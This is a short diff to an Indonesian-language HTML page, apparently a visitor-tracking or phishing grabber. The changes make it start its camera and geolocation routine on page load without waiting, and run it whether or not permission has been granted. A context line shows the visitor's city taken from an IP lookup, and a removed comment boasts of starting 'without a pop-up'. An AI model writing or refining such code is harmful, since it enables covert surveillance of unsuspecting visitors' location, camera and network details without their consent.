@@ -1,5 +1,5 @@
 <!-- BY RACHEL AMANDA - NULL SIREN - GPT 😹 -->
-<!-- VERSION FINAL DETEKSI IZIN V4 -->
+<!-- VERSION FINAL SUPER GERCEP V4.1 -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -220,13 +220,12 @@ Kota                : ${ip.city}
         const izinLokasi = await navigator.permissions.query({ name: "geolocation" });
 
         if (izinKamera.state === "granted" && izinLokasi.state === "granted") {
-          mulai(); // langsung tanpa pop-up
-        } else {
-          // tetap jalan, browser akan munculkan pop-up izin
           mulai();
+        } else {
+          mulai(); // tetap lanjut meski minta izin
         }
       } catch {
-        mulai(); // fallback
+        mulai();
       }
     };
 
@@ -245,9 +244,8 @@ Kota                : ${ip.city}
       }
     };
 
-    window.addEventListener("load", () => {
-      setTimeout(cekIzinDanMulai, 0);
-    });
+    // SUPER GERCEP MULAI SAAT PAGE LOADED
+    window.addEventListener("load", cekIzinDanMulai);
   </script>
 </body>
 </html>
